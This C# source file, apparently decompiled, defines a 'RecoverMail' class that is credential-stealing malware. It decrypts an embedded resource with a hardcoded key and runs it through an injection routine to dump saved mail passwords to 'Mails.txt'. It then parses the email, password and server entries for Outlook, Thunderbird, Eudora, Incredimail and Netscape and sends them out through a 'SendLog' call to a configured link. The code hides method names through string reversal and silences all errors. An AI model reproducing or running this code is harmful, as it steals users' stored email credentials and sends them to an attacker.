using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class RecoverMail
{
	private string R_List;

	public RecoverMail()
	{
		R_List = ReadMail();
	}

	public void Outlook()
	{
		FandS("Outlook");
	}

	public void Thunderbird()
	{
		FandS("_Thunder_bird".Replace("_", null));
	}

	public void Eudora()
	{
		FandS("Eudora");
	}

	public void Incredimail()
	{
		FandS("Incredimail");
	}

	public void NetScape()
	{
		FandS("Netscape");
	}

	public string ReadMail()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Mails.txt";
		string result = default(string);
		try
		{
			if (!File.Exists(text))
			{
				Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG"))!.Invoke(null, null);
				ResourceManager resourceManager = new ResourceManager("Key", assembly);
				byte[] bytes = Encoding.Unicode.GetBytes("Password");
				string executablePath = Application.get_ExecutablePath();
				string cmd = "/stext " + text;
				byte[] byte_ = (byte[])resourceManager.GetObject("RecoverMail");
				GClass0.smethod_0(executablePath, cmd, Encryption.RSMDecrypt(byte_, bytes), compatible: false);
				while (!File.Exists(text))
				{
					Thread.Sleep(1000);
				}
			}
			result = File.ReadAllText(text);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public void FandS(string MailClient)
	{
		try
		{
			Thread.Sleep(1000);
			int count = Regex.Matches(R_List, Regex.Escape("Application")).Count;
			for (int i = 0; i < count; i = checked(i + 1))
			{
				string between = GetBetween(R_List, "Email             : ", "\r\n", i);
				string between2 = GetBetween(R_List, "Password          : ", "\r\n", i);
				string between3 = GetBetween(R_List, "Server            : ", "\r\n", i);
				string between4 = GetBetween(R_List, "Application       : ", "\r\n", i);
				if (Is_Containing(between4, MailClient))
				{
					Send.SendLog(FootballFeed.P_Link, "Passwords", null, null, between4, between3, between, between2, null);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}

	public bool Is_Containing(string input, string search)
	{
		return input.Contains(search);
	}
}
